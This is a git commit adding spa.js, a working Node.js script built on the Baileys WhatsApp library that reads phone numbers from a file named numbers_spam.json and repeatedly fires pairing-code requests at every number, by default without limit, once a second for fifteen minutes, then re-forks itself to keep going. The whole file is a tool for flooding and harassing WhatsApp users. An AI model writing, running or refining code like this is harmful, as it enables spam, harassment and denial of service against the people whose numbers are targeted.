42c68e5b72ca62fbdd0b6141ce8cd75656d6eff8
socket <105087359+MogetSocket1@users.noreply.github.com>
2024-09-28 20:44:39 +0100

    Create spa.js

---
+++ spa.js
@@ -0,0 +1,102 @@
+const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
+const pino = require('pino');
+const readline = require("readline");
+const axios = require('axios');
+const path = require('path');
+const fs = require('fs').promises;
+const { fork } = require('child_process');
+
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+
+const question = (text) => new Promise((resolve) => rl.question(text, resolve));
+
+async function fetchPhoneNumbers() {
+    try {
+        const data = await fs.readFile('numbers_spam.json', 'utf8');
+        const jsonData = JSON.parse(data);;
+        return Object.values(jsonData).flat();
+    } catch (error) {
+        return [];
+    }
+}
+
+async function processRequests(XeonBotInc, phoneNumbers, xeonCodes) {
+    const promises = phoneNumbers.slice(0, xeonCodes).map(async (number) => {
+        try {
+            await XeonBotInc.requestPairingCode(number);
+        } catch (error) {
+        }
+    });
+
+    await Promise.all(promises);
+}
+
+async function XeonProject() {
+    const { state } = await useMultiFileAuthState('./session_sp');
+    const XeonBotInc = makeWASocket({
+        logger: pino({ level: "silent" }),
+        printQRInTerminal: false,
+        auth: state,
+        connectTimeoutMs: 60000,
+        defaultQueryTimeoutMs: 0,
+        keepAliveIntervalMs: 10000,
+        emitOwnEvents: true,
+        fireInitQueries: true,
+        generateHighQualityLinkPreview: true,
+        syncFullHistory: true,
+        markOnlineOnConnect: true,
+        browser: ["Ubuntu", "Chrome", "20.0.04"],
+    });
+
+    try {
+        let phoneNumbers = await fetchPhoneNumbers();
+        let xeonCodes;
+
+        const choicePromise = question('Choose (1 for 100, 2 for 1000, 3 for unlimited): ');
+        const timeoutPromise = new Promise((resolve) => setTimeout(() => resolve('3'), 1000));
+
+        const choice = await Promise.race([choicePromise, timeoutPromise]);
+
+        switch (choice) {
+            case '1':
+                xeonCodes = 100;
+                break;
+            case '2':
+                xeonCodes = 1000;
+                break;
+            case '3':
+            case '':
+                xeonCodes = Infinity;
+                break;
+            default:
+                xeonCodes = Infinity;
+                break;
+        }
+
+        const requestInterval = setInterval(async () => {
+            try {
+                phoneNumbers = await fetchPhoneNumbers();
+                await processRequests(XeonBotInc, phoneNumbers, xeonCodes);
+            } catch (error) {
+            }
+        }, 1000);
+
+        setTimeout(() => {
+            clearInterval(requestInterval);
+            process.exit(0);
+        }, 900000);
+
+    } catch (error) {
+    } finally {
+        rl.close();
+    }
+
+    return XeonBotInc;
+}
+
+XeonProject().then(() => {
+    const scriptPath = path.resolve(__filename);
+    setTimeout(() => {
+        fork(scriptPath);
+    }, 1000);
+});
